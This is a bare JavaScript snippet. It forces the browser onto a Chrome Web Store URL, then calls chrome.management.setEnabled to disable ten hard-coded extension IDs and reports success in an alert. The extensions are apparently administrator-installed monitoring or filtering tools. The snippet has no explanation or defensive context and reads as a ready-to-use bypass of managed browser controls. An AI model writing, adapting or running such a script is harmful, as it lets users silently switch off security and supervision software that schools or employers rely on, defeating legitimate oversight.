if (location.host != "chrome.google.com" || !location.pathname.startsWith("/webstore")) {
    location.href = "https://chrome.google.com/webstorex";
}
const extentions = ["haldlgldplgnggkjaafhelgiaglafanh", "ihjgnoifhnilgbjicdpingfgjhjeffij", "kmpjlilnemjciohjckjadmgmicoldglf", "ifeifkfohlobcbhmlfkenopaimbmnahb", "jaoebcikabjppaclpgbodmmnfjihdngk", "kbohafcopfpigkjdimdcdgenlhkmhbnc", "gcjpefhffmcgplgklffgbebganmhffje", "lgcbihdlknkcmmnapfocjbkdefkhmolo", "inomeogfingingihgjfjlpeplalcfajhgai", "kjbhikpohdgdbchnlbokilnkakadconi"]
for( e in extentions ){
    chrome.management.setEnabled(extentions[e], false,)
}
alert(`0x01A-Success`)
